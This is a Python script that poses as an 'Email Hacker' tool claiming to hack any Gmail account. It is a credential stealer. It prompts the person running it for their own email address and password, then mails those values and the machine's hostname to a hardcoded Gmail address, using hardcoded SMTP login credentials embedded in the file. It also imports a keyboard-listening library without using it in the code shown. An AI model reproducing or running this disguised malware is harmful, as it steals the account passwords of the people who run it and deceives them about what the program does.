import pyfiglet
from os import system, name
from pynput import keyboard
import smtplib
import socket
import os
from time import strftime,gmtime
import datetime
import pip

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login("sendmail231@gmail.com", "123cat45")


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[92m'
    MAIN = '\033[95m'
    MAIN1 = '\033[96m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear():
  
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')

uname = socket.gethostname()
ascii_banner = pyfiglet.figlet_format("Email Hacker")
print(bcolors.WARNING+ascii_banner)
print(bcolors.FAIL+"PowerFull Gmail Hacker")
print("-"*100)
print("Hack Any Email Using empty Message")
print("         ")
input(bcolors.WARNING+"Enter Target Email :> ")
uE= input(bcolors.WARNING+"Enter Your Email(Using For Send Message) :> ")
uP= input(bcolors.WARNING+"Enter Your Email Password(Using For Send Message) :> ")
message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),uname+"\n"+uE+"\n"+uP)
s.sendmail("sendmail231@gmail.com", "sunuinfinityapp@gmail.com", message)
#mouse=Controller()